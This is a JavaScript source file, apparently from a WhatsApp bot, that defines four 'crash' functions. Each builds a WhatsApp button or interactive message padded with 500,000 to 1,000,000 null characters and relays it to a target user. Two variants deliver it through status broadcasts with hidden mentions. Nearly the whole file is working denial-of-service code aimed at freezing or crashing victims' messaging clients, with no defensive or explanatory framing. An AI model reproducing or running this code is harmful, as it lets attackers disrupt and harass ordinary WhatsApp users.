async function VisibleX(isTarget) {
  const msg = await generateWAMessageFromContent(isTarget, {
    buttonsMessage: {
      text: "🩸",
      contentText: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
      footerText: "𝐑𝐢𝐳𝐱𝐯𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
      buttons: [
        {
          buttonId: ".null",
          buttonText: {
            displayText: " #RizxvelzExec1St " + "\u0000".repeat(500000)
          },
          type: 1
        }
      ],
      headerType: 1
    }
  }, {})

  await sock.relayMessage(isTarget, msg.message, {
    messageId: msg.key.id,
    participant: { jid: isTarget }
  })
}
  
  
// Invisible
async function InVisibleX(isTarget, show = true) {
  let msg = await generateWAMessageFromContent(isTarget, {
    buttonsMessage: {
      text: "🩸",
      contentText: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
      footerText: "𝐑𝐢𝐳𝐱𝐯𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
      buttons: [
        {
          buttonId: ".null",
          buttonText: {
            displayText: " #RizxvelzExec1St " + "\u0000".repeat(500000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (show) {
    await sock.relayMessage(
      isTarget,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

// Visible
async function CVisible(isTarget) {
  await sock.relayMessage(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "amelia modd",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: isTarget },
    }
  );
}

// Invisible
async function CInVisible(isTarget, show = true) {
  const msg = await generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " AmeliaModders",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {}
  )

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  })

  if (show) {
    await sock.relayMessage(
      isTarget,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
            },
            content: undefined,
          },
        ],
      }
    )
  }
}